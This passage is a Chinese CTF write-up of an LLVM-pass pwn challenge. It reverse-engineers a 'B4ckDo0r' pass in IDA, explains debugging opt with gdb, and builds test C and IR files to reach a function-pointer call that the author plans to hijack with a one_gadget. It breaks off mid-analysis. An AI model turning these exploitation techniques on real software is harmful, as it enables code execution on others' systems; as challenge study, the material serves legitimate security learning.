<p>这一题的附件很难找，笔者将其放在了自己的<a target="_blank" rel="noopener" href="https://github.com/Hornos3/pwnfile">github</a>中，便于读者复现。</p>
<p>首先当然是使用IDA打开。发现符号表被抠了，不过我们还是有定位runOnFunction的方法。<br />
需要注意的是，题目中给的runOnFunction函数是覆写的llvm库中的runOnFunction方法，因此其一定会被vtable表引用，而vtable表在.rodata段中，只需要调到IDA-view界面查看名字未知的函数中哪一个有足够的长度，而且被.rodata段引用即可。</p>
<p><img src="1.png" alt="" /><br />
发现红框中的两个函数都有足够的长度，但是只有sub_19D0被.rodata段引用，因此判定这就是覆写的runOnFunction方法了。</p>
<p>由于我们有llvm的所有头文件源码，因此对于.so文件中llvm方法的调用，我们都可以找到相应的声明，有助于我们理解代码本身。</p>
<h2 id="1-逆向分析"><a class="markdownIt-Anchor" href="#1-逆向分析"></a> 1. 逆向分析</h2>
<p><img src="2.png" alt="" /><br />
首先进行的是两个条件判断，这里判断rdx是否为8，函数的返回值是否等于该字符串的值。经过调试发现，上面的函数<code>getName()</code>的返回值是<code>llvm::value</code>对象的名字。需要注意的是，<code>llvm::value</code>是llvm中最重要的一个类，其可以代表一个常量、变量、指令或函数。这里可以看到如果对象的名字不是<code>B4ckDo0r</code>，则会直接退出不作处理。要想进行下面的处理，我们就必须要让一个函数的名字为<code>B4ckDo0r</code>。至于前面对rdx的判断，这应该也算是<code>getName()</code>函数的返回值，其表示的是对象名字的长度。显而易见，<code>B4ckDo0r</code>的长度为8，因此这里判断长度是否为8合情合理。</p>
<p>注：这里说明一下llvm pass类题目如何调试。</p>
<p>我们需要通过opt程序加载.so链接库，同时输入.ll文件以生成IR输出，因此应该调试opt这个程序（带参数的opt调试方式：<code>gdb opt</code>、<code>r 参数, 参数,...</code>），我们可以先对opt下一个在main开头的断点，保证其在一开始执行就能够中断，注意此时.so链接库并未被加载到内存中，本题的opt程序中在main函数有一堆函数调用，快速步过后经过某一条call指令可以发现.so库被加载，此时再下链接库的断点，继续执行就可以让程序断在我们想要调试的runOnFunction()函数了。这种方式是笔者自己探索出来的，比较麻烦，但由于这方面的资料实在太少，找不到现成的参考，只能先这样做了。如有更加简便的方法还请读者不吝赐教。</p>
<p>前面我们知道了只有名为<code>B4ckDo0r</code>的函数才能被优化，后面的代码错综复杂，手动地去一步步分析显然是不太现实的，我们重点关注一下程序中提到的字符串，看能不能找到一些流程控制的线索。</p>
<p><code>(line 175) if ( !(unsigned int)str_compare(&amp;p_dest, &quot;save&quot;) )</code><br />
<code>(line 300) if ( (unsigned int)str_compare(&amp;p_dest, &quot;takeaway&quot;) )</code><br />
<code>(line 444) if ( !(unsigned int)str_compare(&amp;p_dest, &quot;stealkey&quot;) )</code><br />
<code>(line 469) if ( !(unsigned int)str_compare(&amp;p_dest, &quot;fakekey&quot;) )</code><br />
<code>(line 517) if ( !(unsigned int)str_compare(&amp;p_dest, &quot;fakekey&quot;) )</code></p>
<p>我们很容易能够找到上面的几行语句，这里的save、takeaway等字符串显然是突破的关键所在。</p>
<p>经过调试发现，这里的<code>&amp;p_dest</code>指的是函数中操作符的名字，如第一条语句调用printf函数时，操作符名即为printf。因此我们不仅要保证其函数名为<code>B4ckDo0r</code>，还要保证其中调用的函数名为上面五个字符串中的一个。</p>
<p>在save控制流程中，我们发现了这些代码，通过字符串可以猜测出这应该是报错信息，对于使用C语言程序正常生成的.ll文件，应该不会有这样的问题出现。因此在下面凡是看到跳转到这些label的代码，就统统都可以不看了，能够节省很多时间。</p>
<p><img src="3.png" alt="" /><br />
剔除掉这些检查的代码之后，我们发现真正对我们有用的代码实际上也就这么几行。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// save</span></span><br><span class="line">            v31 = n;</span><br><span class="line">            v32 = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">            v32[<span class="number">2</span>] = byte_2040f8;</span><br><span class="line">            byte_2040f8 = v32;</span><br><span class="line">            v33 = (<span class="type">char</span> *)src;</span><br><span class="line">            <span class="built_in">memcpy</span>(v32, src, v31);</span><br><span class="line">            v34 = v32 + <span class="number">1</span>;</span><br><span class="line">            v35 = (<span class="type">char</span> *)v84[<span class="number">0</span>];</span><br><span class="line">            <span class="built_in">memcpy</span>(v34, v84[<span class="number">0</span>], (<span class="type">size_t</span>)v84[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span> ( v35 != &amp;v85 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v35)</span></span>;</span><br><span class="line">              v33 = (<span class="type">char</span> *)src;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v33 != v88 )</span><br><span class="line">              <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v33)</span></span>;</span><br><span class="line"><span class="comment">// stealkey</span></span><br><span class="line">          v66 = llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">          <span class="keyword">if</span> ( byte_2040f8</span><br><span class="line">            &amp;&amp; !(<span class="number">-1431655765</span></span><br><span class="line">               * (<span class="type">unsigned</span> <span class="type">int</span>)((v15</span><br><span class="line">                               + <span class="number">24</span> * v65</span><br><span class="line">                               - <span class="number">24LL</span> * v66</span><br><span class="line">                               - (v8</span><br><span class="line">                                - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)(*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>))) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">          &#123;</span><br><span class="line">            byte_204100 = *byte_2040f8;</span><br><span class="line">          &#125;</span><br><span class="line"><span class="comment">// fakekey</span></span><br><span class="line">              v76 = byte_204100;</span><br><span class="line">              <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v75 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">                SExtValue = llvm::APInt::<span class="built_in">getSExtValue</span>((llvm::APInt *)(*(_QWORD *)v75 + <span class="number">24LL</span>));</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                SExtValue = <span class="number">0LL</span>;</span><br><span class="line">              byte_204100 = v76 + SExtValue;</span><br><span class="line">              *byte_2040f8 = v76 + SExtValue;</span><br><span class="line"><span class="comment">// run</span></span><br><span class="line">          <span class="keyword">if</span> ( !(<span class="number">-1431655765</span></span><br><span class="line">               * (<span class="type">unsigned</span> <span class="type">int</span>)((v15</span><br><span class="line">                               + <span class="number">24</span> * v80</span><br><span class="line">                               - <span class="number">24LL</span></span><br><span class="line">                               * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>))</span><br><span class="line">                               - (v8</span><br><span class="line">                                - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)(*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>))) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">            ((<span class="built_in">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*byte_2040f8)(</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              <span class="number">0LL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( p_dest != &amp;dest )</span><br><span class="line">          <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(p_dest)</span></span>;</span><br><span class="line">        v7 = v83;</span><br></pre></td></tr></table></figure>
<p>注意save中的malloc函数，它分配了一个0x20大小的chunk到bss段中，随后进行了两次memcpy内存拷贝向里面写入了某些值，具体操作如何我们下面调试的时候再行分析。在takeaway中有一大堆的条件，但最终只有一个free，猜测是满足某些条件后会释放save中分配的chunk。在stealkey中将chunk地址保存到了另外一个位置，且这个位置就在保存chunk地址的位置的上面。在fakekey中将保存chunk地址的地方写入了某个值。在run中将保存chunk的地址作为一个函数指针执行。可见如果能够在保存chunk的地方写入one_gadget，就能够打通这道题了。</p>
<p>下面开始调试。</p>
<h2 id="2-调试与解题"><a class="markdownIt-Anchor" href="#2-调试与解题"></a> 2. 调试与解题</h2>
<p>第一次测试代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">	save();</span><br><span class="line">	takeaway();</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey();</span><br><span class="line">	run();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [7 x i8] c&quot;123456\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [7 x i8] c&quot;654321\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [7 x i8] c&quot;abcdef\00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [7 x i8] c&quot;fedcba\00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [7 x i8] c&quot;888888\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i32 @printf(i8*, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @takeaway() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @stealkey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @fakekey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @run() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @B4ckDo0r() #0 &#123;</span><br><span class="line">  %1 = alloca i32, align 4</span><br><span class="line">  store i32 0, i32* %1, align 4</span><br><span class="line">  call void @save()</span><br><span class="line">  call void @takeaway()</span><br><span class="line">  call void @stealkey()</span><br><span class="line">  call void @fakekey()</span><br><span class="line">  call void @run()</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;clang version 10.0.0-4ubuntu1 &quot;&#125;</span><br></pre></td></tr></table></figure>
<p>在遍历到B4ckDo0r函数的save函数调用时，发现有一个判断条件通不过：<br />
<code>if ( -1431655765 * (unsigned int)((v15 + 24 * v18 - 24 * (unsigned __int64)NumTotalBundleOperands - v20) &gt;&gt; 3) == 2 )</code></p>
<p>推测是函数返回值或参数类型不匹配的问题，于是开始了长时间的调试和修改。</p>
<p>这里发现使用clang-10生成的.ll文件丢到opt里面会报错，本题使用的clang版本为clang-8，解决方法是：<code>apt install clang-8</code>，然后使用clang-8生成.ll文件。</p>
<p>经过调试发现，上面的一长串语句的等号左边值为函数的参数个数。也就是说，save函数需要有两个参数。于是我们有了第二个测试代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span>* a, <span class="type">char</span>* b)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">	save(<span class="string">&quot;follow&quot;</span>, <span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">	takeaway();</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey();</span><br><span class="line">	run();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [7 x i8] c&quot;123456\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [7 x i8] c&quot;654321\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [7 x i8] c&quot;abcdef\00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [7 x i8] c&quot;fedcba\00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [7 x i8] c&quot;888888\00&quot;, align 1</span><br><span class="line">@.str.5 = private unnamed_addr constant [7 x i8] c&quot;follow\00&quot;, align 1</span><br><span class="line">@.str.6 = private unnamed_addr constant [11 x i8] c&quot;helloworld\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save(i8*, i8*) #0 &#123;</span><br><span class="line">  %3 = alloca i8*, align 8</span><br><span class="line">  %4 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %3, align 8</span><br><span class="line">  store i8* %1, i8** %4, align 8</span><br><span class="line">  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i32 @printf(i8*, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @takeaway() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @stealkey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @fakekey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @run() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @B4ckDo0r() #0 &#123;</span><br><span class="line">  call void @save(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0))</span><br><span class="line">  call void @takeaway()</span><br><span class="line">  call void @stealkey()</span><br><span class="line">  call void @fakekey()</span><br><span class="line">  call void @run()</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;clang version 8.0.1-9 (tags/RELEASE_801/final)&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>经过调试发现，对于上面有两个参数的save函数，.so库中的方法将其传入的函数的两个实参的内容拷贝到了一个chunk中，这是两个memcpy函数干的事情。之后的两个判断条件也是直接绕过，没有执行delete。</p>
<p>而第二条调用takeaway的语句的识别中，也有一个关于参数个数的判断：<br />
